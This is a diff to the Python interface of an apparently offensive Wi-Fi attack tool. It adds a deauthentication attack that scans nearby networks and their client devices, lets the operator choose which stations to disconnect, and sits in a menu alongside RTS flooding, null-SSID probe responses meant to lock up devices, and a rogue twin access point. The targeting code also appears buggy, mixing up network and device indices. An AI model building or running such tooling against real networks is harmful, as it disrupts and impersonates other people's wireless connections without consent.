@@ -19,19 +19,64 @@ class UI:
         self.screen = Drawer.drawer()
         self.attack_int = attack_int
         self.control_int = control_int
-        self.attacks = [self.rts_flood, self.null_probe_response, self.rogue_twin]
+        self.attacks = [self.rts_flood, self.null_probe_response, self.rogue_twin, self.deauth]
         self.attacker = Attacker.attacker(self.attack_int)
         self.sniffer = Sniffer.sniffer(self.control_int, self.attack_int)
 
     def main_window(self):
         raws = [["0", "RTS flood",
                  "Floods RTS/CTS frames to reserve the RF medium and force other wireless devices sharing the RF medium to hold back their transmissions"]]
-        raws.append(["1", "Null Probe Response", "❌"])
-        raws.append(["2", "Rogue twin", "Creates fake AP with the same channel and SSID as target"])  # "✅"
-        raws.append(["3", "Coming soon", "..."])
+        raws.append(["1", "Null Probe Response", "Sending probe response containing a null SSID. Causes lock up upon receiving such a probe response"])
+        raws.append(["2", "Rogue twin", "Creates fake AP with the same channel and SSID as target"])  # "✅" "❌"
+        raws.append(["3", "Deauthentication attack", "Attempts to disconnect specific stations in range"])
+        raws.append(["4", "Coming soon", "..."])
         self.screen.draw_table(["No.", "Name", "Brief descr."], raws)
 
         self.attacks[self.screen.get_input("Witch attack you wanna run?", int)]()
+
+    def deauth(self):
+        self.screen.clean()
+
+        Freq = self.__ask_Freq('''Deauthentication Attack\n''')
+
+
+        self.nets = self.sniffer.scan_nets_(Freq)
+
+        self.screen.clean()
+
+        self.screen.draw_table(["No.", "SSID", "BSSID", "Freq", "Channel", "802.11 standart"], self.nets, '''Deauthentication Attack\n'''
+                                                                                                    '''Choose net to be attacked''')
+        target_nets = self.screen.get_input("Choose nets to be attacked (print digit or combination):")
+        print(target_nets)
+
+        target_info = []
+        print("target_BSSIDs:")
+        for i in target_nets:
+            target_info.append([self.nets[i][2], self.nets[i][4], self.nets[i][1]])
+            print([self.nets[i][2], self.nets[i][4]])
+
+        self.devices = self.sniffer.scan_devices_(Freq, target_info)
+
+        self.screen.clean()
+
+        self.screen.draw_table(["No.", "MAC", "Freq", "Channel", "Net SSID", "Net BSSID"], self.devices,
+                               '''Deauthentication Attack\n'''
+                               '''Choose device to be attacked''')
+        target_device = self.screen.get_input("Choose device to be attacked (print digit or combination):")
+        print(target_device)
+
+        args = []
+        target = []
+        for i in target_nets:
+            args.append({
+                "MAC": self.devices[i][1],
+                "BSSID": self.nets[i][4],
+                "Freq": self.nets[i][2],
+                "Channel": self.nets[i][3]
+            })
+            target.append(self.devices[i][1])
+
+        self.run_attack("deauth", target, args)
 
     def null_probe_response(self):
         self.screen.clean()
@@ -64,7 +109,18 @@ class UI:
         target_device = self.screen.get_input("Choose device to be attacked (print digit or combination):")
         print(target_device)
 
-        self.run_attack("null_probe_response", target_device)
+        args = []
+        target = []
+        for i in target_nets:
+            args.append({
+                "MAC": self.devices[i][1],
+                "BSSID": self.nets[i][4],
+                "Freq": self.nets[i][2],
+                "Channel": self.nets[i][3]
+            })
+            target.append(self.devices[i][1])
+
+        self.run_attack("null_probe_response", target, args)
 
     def rogue_twin(self):
         self.screen.clean()
